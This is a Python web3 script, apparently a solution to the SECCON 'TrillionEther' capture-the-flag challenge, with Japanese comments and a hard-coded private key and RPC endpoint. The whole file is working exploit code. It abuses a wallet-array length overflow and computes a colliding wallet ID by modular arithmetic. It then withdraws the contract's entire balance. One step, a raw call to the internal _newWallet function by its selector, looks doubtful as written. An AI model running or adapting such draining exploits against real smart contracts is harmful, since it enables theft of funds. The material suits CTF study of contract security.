from web3 import Web3
from eth_abi import encode
# 接続情報を設定
rpc_endpoint = 'http://trillion-ether.seccon.games:8545/3bb9f786-7c5d-40c7-9150-ee7432ed23d4'
private_key = 'b586acd8ab9536f2ee3f0266995276e07fc76503aab8170a1966487b65d348ad'
challenge_contract_address = '0x075c3128bE0ed00bc16A8e8c8C688623E44Ce549'

# コントラクトのABIhttp://trillion-ether.seccon.games:8545/d886ab6f-050b-4710-8c81-fff648b2aed4
abi = [
    {
        "inputs": [],
        "stateMutability": "payable",
        "type": "constructor"
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "bytes32",
                "name": "name",
                "type": "bytes32"
            }
        ],
        "name": "createWallet",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "uint256",
                "name": "fromWalletId",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "toWalletId",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "transfer",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "uint256",
                    "name": "walletId",
                    "type": "uint256"
                },
                {
                    "internalType": "uint256",
                    "name": "amount",
                    "type": "uint256"
                }
            ],
            "name": "withdraw",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "wallets",
            "outputs": [
                {
                    "components": [
                        {
                            "internalType": "bytes32",
                            "name": "name",
                            "type": "bytes32"
                        },
                        {
                            "internalType": "uint256",
                            "name": "balance",
                            "type": "uint256"
                        },
                        {
                            "internalType": "address",
                            "name": "owner",
                            "type": "address"
                        }
                    ],
                    "internalType": "struct TrillionEther.Wallet[]",
                    "name": "",
                    "type": "tuple[]"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        }
    ]
# Web3の初期化
w3 = Web3(Web3.HTTPProvider(rpc_endpoint))
account = w3.eth.account.from_key(private_key)

contract = w3.eth.contract(address=challenge_contract_address, abi=abi)

def exploit():
    # ステップ1: wallets.lengthを大きな値に設定
    large_number = 2 ** 256 - 1
    name = (large_number).to_bytes(32, 'big')
    tx = contract.functions.createWallet(name).build_transaction({
        'from': account.address,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas': 500000,
        'gasPrice': w3.to_wei('1', 'gwei'),
        'value': 0
    })
    signed_tx = w3.eth.account.sign_transaction(tx, private_key=private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    w3.eth.wait_for_transaction_receipt(tx_hash)
    print("Step 1: wallets.lengthを上書きしました。")

    # ステップ2: _newWallet関数を直接呼び出す
    # _newWallet(bytes32 name, uint256 balance, address owner)
    # 関数シグネチャを取得
    function_signature = '0x' + Web3.keccak(text='_newWallet(bytes32,uint256,address)').hex()[2:10]

    # 1兆EtherをWeiに換算
    one_trillion_ether = 1_000_000_000_000 * (10 ** 18)

    # データをABIエンコード
    data = function_signature + encode(
        ['bytes32', 'uint256', 'address'],
        [b'\x00'*32, one_trillion_ether, account.address]
    ).hex()

    # 低レベルのcallを実行
    tx = {
        'from': account.address,
        'to': challenge_contract_address,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas': 500000,
        'gasPrice': w3.to_wei('1', 'gwei'),
        'value': 0,
        'data': data
    }
    signed_tx = w3.eth.account.sign_transaction(tx, private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print("Step 2: _newWalletを直接呼び出してwalletを作成しました。")

    # ステップ3: walletIdを計算
    K = int.from_bytes(Web3.keccak((0).to_bytes(32, 'big')), 'big')
    inv_3 = pow(3, -1, 2 ** 256)
    wallet_id = (-K * inv_3) % (2 ** 256)
    print(f"Calculated wallet_id: {wallet_id}")

    # ステップ4: コントラクトの残高を取得
    contract_balance = w3.eth.get_balance(challenge_contract_address)
    print(f"Contract balance: {contract_balance}")

    # ステップ5: withdrawを実行（wallet_idを正しく使用）
    tx = contract.functions.withdraw(wallet_id, contract_balance).build_transaction({
        'from': account.address,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas': 500000,
        'gasPrice': w3.to_wei('1', 'gwei'),
    })
    signed_tx = w3.eth.account.sign_transaction(tx, private_key=private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    w3.eth.wait_for_transaction_receipt(tx_hash)
    print("Step 5: コントラクトの残高を引き出しました。")

    # ステップ6: isSolved()を確認
    solved = contract.functions.isSolved().call()
    print(f"Step 6: isSolved() = {solved}")

if __name__ == '__main__':
    exploit()
